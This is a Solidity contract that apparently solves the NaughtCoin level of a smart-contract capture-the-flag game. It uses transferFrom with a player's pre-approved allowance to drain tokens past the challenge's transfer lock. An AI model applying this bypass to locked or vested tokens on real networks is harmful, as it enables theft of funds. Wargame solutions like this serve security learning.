pragma solidity ^0.8.0;
import "../Challenge/NaughtCoin.sol";

contract NaughtCracker {
    NaughtCoin naughtCoin;

    constructor(address _ncoinAddress) public {
        naughtCoin = NaughtCoin(_ncoinAddress);
    }

    function crackTransfer(address _player) public {
        uint256 currentAllowed = naughtCoin.allowance(
            address(_player),
            address(this)
        );
        naughtCoin.transferFrom(
            address(_player),
            address(this),
            currentAllowed
        );
    }
}
